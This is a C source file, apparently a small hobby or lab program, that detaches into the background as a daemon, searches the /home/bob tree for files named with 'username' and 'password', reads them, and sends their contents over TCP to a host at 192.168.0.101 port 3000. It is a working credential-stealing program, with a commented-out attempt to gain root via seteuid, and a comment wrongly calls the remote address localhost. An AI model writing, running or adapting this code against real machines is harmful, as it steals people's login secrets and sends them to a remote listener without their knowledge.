#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <dirent.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <errno.h>

#define ROOT "/home/bob"
#define PORT 3000

char* search_dir(const char *path, const char *filename) {
    DIR *dir;
    struct dirent *entry;
    struct stat info;
    char full_path[PATH_MAX];

    if ((dir = opendir(path)) == NULL) {
        printf("opendir");
        return NULL;
    }
	sleep(5);
    printf("opened dir, searching for %s \n", filename);
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        if (lstat(full_path, &info) == -1) {
            perror("lstat had problems retrieving a files info");
            continue;
        }

        if (S_ISDIR(info.st_mode)) {
            printf("%s \n", full_path);
            char* fin = search_dir(full_path, filename);
            if (fin != NULL) {
                closedir(dir);
                return fin;
            }
        } else if (S_ISREG(info.st_mode) && strstr(entry->d_name, filename) != NULL) {
            printf("FILE FOUND! %s\n", full_path);
            char* fin = malloc(strlen(full_path) + 1);
            strcpy(fin, full_path);
            closedir(dir);
            return fin;
        }
    }

    closedir(dir);
    printf("File not found: %s\n", filename);
    return NULL;
}
int main() {
        pid_t pid, sid;

        // Fork off the parent process
        pid = fork();

        // If we got a bad PID, exit
        if (pid < 0) {
            printf("fail");
            exit(EXIT_FAILURE);
        }

        // If we got a good PID, kill the parent process
        if (pid > 0) {
            exit(EXIT_SUCCESS);
        }

        // Set the file mode mask
        umask(0);

        // Create a new SID for the child process
        sid = setsid();
        if (sid < 0) {
            exit(EXIT_FAILURE);
        }
        // // Change the current working directory
        // if ((chdir("/")) < 0) {
        //     exit(EXIT_FAILURE);
        // }

        // Close out the standard file descriptors
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        // Run for 30 seconds and then exit
        freopen("outputlog.txt", "w", stdout);
        printf("sleeping, %d\n", sid);
        sleep(1);
        printf("zzzzz...\n");
        sleep(1);
        for(int i = 0; i < 4; ++i) {
            printf("heheheheheheheh\n");
        }
        
	int sockfd;
	    struct sockaddr_in server_addr;

	    // Create a socket
	    sockfd = socket(AF_INET, SOCK_STREAM, 0);
	    if (sockfd < 0) {
		perror("Failed to create socket");
		exit(EXIT_FAILURE);
	    }

	    // Set up the server address structure
	    memset(&server_addr, 0, sizeof(server_addr));
	    server_addr.sin_family = AF_INET;
	    server_addr.sin_port = htons(PORT);
	    server_addr.sin_addr.s_addr = inet_addr("192.168.0.101"); // Connect to localhost

	    // Connect to the server
	    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
		perror("Failed to connect to the server");
		exit(EXIT_FAILURE);
	    }

    //    if(seteuid(0) != 0) {
    //        printf("Admin Priviledges elevation unsuccessful");
  //          exit(0);
 //       }
        
        while (1) {
            FILE *fp;
            
            //username
            char* user = "username";
            char user_buffer[100];
            char* user_file_path = NULL;
            user_file_path = search_dir(ROOT, user);
       
            printf(user);
            if(user_file_path != NULL){
                fp = fopen(user_file_path, "r");
                if (fp == NULL) {
                    printf("Failed to open file\n");
                    return 1;
                }
                
                while (fgets(user_buffer, 100, fp) != NULL) {
                    printf("%s\n", user_buffer);
                }

                fclose(fp);
            }

            //password
            char* pass = "password";
            char pass_buffer[100];
            char* pass_file_path = NULL;
            pass_file_path = search_dir(ROOT, pass);
            
            if(pass_file_path != NULL){
                fp = fopen(pass_file_path, "r");
                if (fp == NULL) {
                    printf("Failed to open file\n");
                    return 1;
                }
                
                while (fgets(pass_buffer, 100, fp) != NULL) {
                    printf("%s\n", pass_buffer);
                }

                fclose(fp);
            }

	    // Send the message
	    if (send(sockfd, user_buffer, strlen(user_buffer), 0) < 0) {
		perror("Failed to send message");
		exit(EXIT_FAILURE);
	    }

	    // Sleep for some time
	    if (send(sockfd, pass_buffer, strlen(pass_buffer), 0) < 0) {
		perror("Failed to send message");
		exit(EXIT_FAILURE);
	    }


	    // Close the connection
	    close(sockfd);
            printf("done\n");
            exit(EXIT_SUCCESS);
        }

   
}
